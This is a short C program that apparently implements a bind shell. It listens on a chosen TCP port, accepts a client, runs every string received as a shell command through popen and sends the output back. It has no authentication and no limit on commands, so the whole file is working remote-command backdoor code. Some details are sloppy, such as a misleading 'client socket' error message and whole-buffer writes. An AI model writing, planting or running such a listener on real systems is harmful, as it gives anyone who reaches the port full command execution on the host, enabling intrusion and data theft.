#include <arpa/inet.h>
#include <getopt.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

static void usage(char *progname)
{
    fprintf(stderr, "usage: %s [-p server_port]\n", progname);
}

static int parse_args(int argc, char *argv[], in_port_t *server_port)
{
    int opt;

    while ((opt = getopt(argc, argv, "p:h")) != -1) {
        switch (opt) {
        case 'p':
            *server_port = htons(atoi(optarg));
            break;

        case 'h':
            return 1;
        }
    }

    if (!(*server_port))
        return 1;

    return 0;
}

int main(int argc, char *argv[])
{
    int server_fd = 0;
    int client_fd = 0;
    struct sockaddr_in server_addr;
    struct sockaddr_in client_addr;
    socklen_t client_len = sizeof(client_addr);
    char client_cmd[1024];
    char server_buffer[1024];
    fd_set rdfs;
    FILE *pipe = NULL;

    memset(&server_addr, 0, sizeof(struct sockaddr_in));

    /* Parse the server ip and port. */
    if (parse_args(argc, argv, &server_addr.sin_port)) {
        usage(argv[0]);
        exit(EXIT_FAILURE);
    }

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd == -1) {
        fprintf(stderr, "fail to create the client socket.\n");
        exit(EXIT_FAILURE);
    }

    server_addr.sin_family = AF_INET;

    /* Bind the server to specified port */
    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(struct sockaddr)) == -1) {
        fprintf(stderr, "fail to bind the server to specified port\n");
        exit(EXIT_FAILURE);
    }

    /* One client accepted. */
    if (listen(server_fd, 1) == -1) {
        fprintf(stderr, "\n");
        exit(EXIT_FAILURE);
    }

    fprintf(stdout, "starting server...\n");

    while (1) {
        client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &client_len);

        fprintf(stdout, "client %s connected\n", inet_ntoa(client_addr.sin_addr));

        while (1) {
            FD_ZERO(&rdfs);
            FD_SET(client_fd, &rdfs);

            if (select(client_fd + 1, &rdfs, NULL, NULL, NULL) == -1)
                continue;

            memset(client_cmd, 0, sizeof(client_cmd));
            memset(server_buffer, 0, sizeof(server_buffer));

            read(client_fd, client_cmd, sizeof(client_cmd));
            if (!strcmp(client_cmd, "exit")) {
                fprintf(stdout, "client %s disconnected\n", inet_ntoa(client_addr.sin_addr));
                close(client_fd);
                break;
            }

            pipe = popen(client_cmd, "r");
            if (pipe) {
                while (fgets(server_buffer, sizeof(server_buffer), pipe))
                    write(client_fd, server_buffer, sizeof(server_buffer));

                pclose(pipe);
                pipe = NULL;
            }
        }
    }

    close(server_fd);

    exit(EXIT_SUCCESS);
}
